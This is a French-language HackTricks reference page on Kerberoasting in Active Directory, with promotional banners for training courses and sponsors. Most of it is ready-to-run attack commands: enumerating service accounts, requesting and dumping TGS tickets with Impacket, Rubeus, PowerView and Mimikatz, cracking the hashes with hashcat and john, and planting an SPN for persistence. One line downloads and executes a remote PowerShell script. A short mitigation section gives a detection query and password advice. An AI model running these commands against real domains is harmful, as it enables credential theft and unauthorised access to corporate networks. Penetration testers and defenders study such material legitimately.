# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) pour créer et **automatiser des flux de travail** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supportez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

## Kerberoast

Kerberoasting se concentre sur l'acquisition de **tickets TGS**, spécifiquement ceux liés aux services fonctionnant sous des **comptes d'utilisateur** dans **Active Directory (AD)**, à l'exclusion des **comptes d'ordinateur**. Le chiffrement de ces tickets utilise des clés qui proviennent des **mots de passe des utilisateurs**, permettant la possibilité de **craquer les identifiants hors ligne**. L'utilisation d'un compte utilisateur en tant que service est indiquée par une propriété **"ServicePrincipalName"** non vide.

Pour exécuter **Kerberoasting**, un compte de domaine capable de demander des **tickets TGS** est essentiel ; cependant, ce processus ne nécessite pas de **privilèges spéciaux**, le rendant accessible à quiconque possède des **identifiants de domaine valides**.

### Points clés :

* **Kerberoasting** cible les **tickets TGS** pour les **services de comptes d'utilisateur** au sein de **AD**.
* Les tickets chiffrés avec des clés provenant des **mots de passe des utilisateurs** peuvent être **craqués hors ligne**.
* Un service est identifié par un **ServicePrincipalName** qui n'est pas nul.
* **Aucun privilège spécial** n'est nécessaire, juste des **identifiants de domaine valides**.

### **Attaque**

{% hint style="warning" %}
Les **outils de Kerberoasting** demandent généralement le **`chiffrement RC4`** lors de l'exécution de l'attaque et de l'initiation des requêtes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne en utilisant des outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que ceux d'AES-256 (type 18) commencent par **`$krb5tgs$18$*`**.` 
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Outils multi-fonction incluant un dump des utilisateurs kerberoastable :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Énumérer les utilisateurs Kerberoastable**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1 : Demander un TGS et le vider de la mémoire**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2 : Outils automatiques**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service Kerberos a été demandé` est généré.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) pour créer et **automatiser des flux de travail** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistance

Si vous avez **suffisamment de permissions** sur un utilisateur, vous pouvez **le rendre kerberoastable** :
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici : [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si vous trouvez cette **erreur** de Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC. Il existe quelques options :

* `ntpdate <IP du DC>` - Obsolète depuis Ubuntu 16.04
* `rdate -n <IP du DC>`

### Atténuation

Le kerberoasting peut être mené avec un haut degré de discrétion s'il est exploitable. Afin de détecter cette activité, une attention particulière doit être portée à **l'ID d'événement de sécurité 4769**, qui indique qu'un ticket Kerberos a été demandé. Cependant, en raison de la haute fréquence de cet événement, des filtres spécifiques doivent être appliqués pour isoler les activités suspectes :

* Le nom du service ne doit pas être **krbtgt**, car il s'agit d'une demande normale.
* Les noms de service se terminant par **$** doivent être exclus pour éviter d'inclure des comptes machines utilisés pour des services.
* Les demandes provenant de machines doivent être filtrées en excluant les noms de compte formatés comme **machine@domaine**.
* Seules les demandes de ticket réussies doivent être considérées, identifiées par un code d'échec de **'0x0'**.
* **Le plus important**, le type de cryptage du ticket doit être **0x17**, qui est souvent utilisé dans les attaques de kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Pour atténuer le risque de Kerberoasting :

* Assurez-vous que **les mots de passe des comptes de service sont difficiles à deviner**, en recommandant une longueur de plus de **25 caractères**.
* Utilisez des **comptes de service gérés**, qui offrent des avantages tels que **des changements de mot de passe automatiques** et **une gestion déléguée des noms de principal de service (SPN)**, renforçant la sécurité contre de telles attaques.

En mettant en œuvre ces mesures, les organisations peuvent réduire considérablement le risque associé au Kerberoasting.

## Kerberoast sans compte de domaine

En **septembre 2022**, un nouveau moyen d'exploiter un système a été mis en lumière par un chercheur nommé Charlie Clark, partagé via sa plateforme [exploit.ph](https://exploit.ph/). Cette méthode permet l'acquisition de **tickets de service (ST)** via une demande **KRB\_AS\_REQ**, qui ne nécessite remarquablement pas de contrôle sur un compte Active Directory. Essentiellement, si un principal est configuré de manière à ne pas nécessiter de pré-authentification—un scénario similaire à ce qui est connu dans le domaine de la cybersécurité comme une attaque **AS-REP Roasting**—cette caractéristique peut être exploitée pour manipuler le processus de demande. Plus précisément, en modifiant l'attribut **sname** dans le corps de la demande, le système est trompé pour émettre un **ST** plutôt que le Ticket Granting Ticket (TGT) chiffré standard.

La technique est entièrement expliquée dans cet article : [Publication de blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Vous devez fournir une liste d'utilisateurs car nous n'avons pas de compte valide pour interroger l'LDAP en utilisant cette technique.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py de la PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus de la PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Références

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) pour construire et **automatiser des workflows** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
